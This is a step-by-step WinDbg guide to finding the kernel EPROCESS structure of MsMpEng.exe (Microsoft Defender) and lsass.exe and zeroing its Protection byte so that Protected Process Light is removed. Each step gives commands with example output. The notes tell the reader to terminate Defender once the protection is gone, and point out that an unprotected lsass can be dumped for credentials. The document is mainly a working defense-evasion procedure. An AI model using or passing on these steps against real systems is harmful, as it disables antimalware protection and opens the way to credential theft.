# Protected Process (PPL) — WinDbg Investigation

Windows protects certain processes using **Protected Process Light (PPL)**. A PPL process cannot be opened, read, or terminated by non-protected processes — even as SYSTEM. The protection is stored as a single byte called `Protection` inside `_EPROCESS`. It encodes two things:

- **Type** (bits 0–2) — `0` = none, `1` = PPL, `2` = PP
- **Signer** (bits 4–7) — who signed the binary. `3` = Antimalware, `4` = Lsa, `6` = WinTcb

MsMpEng.exe runs as PPL-Antimalware → `Type=1, Signer=3` → byte value `0x31`.

Zeroing this byte drops the process to unprotected — it can then be opened and terminated normally.

---

## Step 1 — Find the Process

```
!process 0 0 MsMpEng.exe
!process 0 0 lsass.exe
```

Scans all processes and returns the `_EPROCESS` pointer for MsMpEng.exe. Save this address — everything else is built from it.

**Example output:**
```
PROCESS ffffd209`089a3080
    SessionId: 0  Cid: 0cac    Peb: 5cb8f37000  ParentCid: 02bc
    DirBase: 16108b002  ObjectTable: ffffe303d3e71b40  HandleCount: 803.
    Image: MsMpEng.exe
```

> Save `ffffd209089a3080` as **EPROCESS base**.

---

## Step 2 — Find the Protection Field Offset

```
dt nt!_EPROCESS 0 Protection
```

Passing `0` as the address queries the type layout without reading memory — gives the exact offset of `Protection` on your build.

**Example output:**
```
nt!_EPROCESS
   +0x6fa Protection : _PS_PROTECTION
```

> Offset is `+0x6fa` on this build. Used in Steps 3 and 4.

---

## Step 3 — Read the Protection Level

```
dt nt!_PS_PROTECTION ffffd209`089a3080+0x6fa
```

EPROCESS base + `0x6fa` from Step 2. Dumps the protection byte and its bitfields.

**Example output:**
```
nt!_PS_PROTECTION
   +0x000 Level  : 0x31 '1'           ← full byte (0x31 = PPL-Antimalware)
   +0x000 Type   : 0y001              ← 1 = ProtectedLight (PPL)
   +0x000 Audit  : 0y0
   +0x000 Signer : 0y0011             ← 3 = Antimalware
```

---

## Step 4 — Remove the Protection

```
eb ffffd209`089a3080+0x6fa 0
```

Writes `0` to the protection byte — Type and Signer both become 0. MsMpEng.exe is now fully unprotected and can be opened and terminated from usermode.

**Verify:**
```
dt nt!_PS_PROTECTION ffffd209`089a3080+0x6fa
   +0x000 Level  : 0x0    ← protection gone ✓
   +0x000 Type   : 0y000
   +0x000 Audit  : 0y0
   +0x000 Signer : 0y0000
```

---

## Protection Byte Reference

| Process | Type | Signer | Byte |
|---------|------|--------|------|
| MsMpEng.exe | PPL | Antimalware (3) | `0x31` |
| lsass.exe (if RunAsPPL enabled) | PPL | Lsa (4) | `0x41` |
| csrss.exe | PP | WinTcb (6) | `0x62` |
| smss.exe | PP | WinTcb (6) | `0x62` |

> lsass.exe is only PPL if `RunAsPPL = 1` is set under `HKLM\SYSTEM\CurrentControlSet\Control\Lsa`. If not set, Level = 0 and lsass is unprotected — no kernel access needed to dump it.

---

## Notes
- `Protection` offset is **build-specific** — always run `dt nt!_EPROCESS 0 Protection` on your target first.
- Removing PPL from MsMpEng.exe does not stop Defender — terminate the process after unprotecting it.
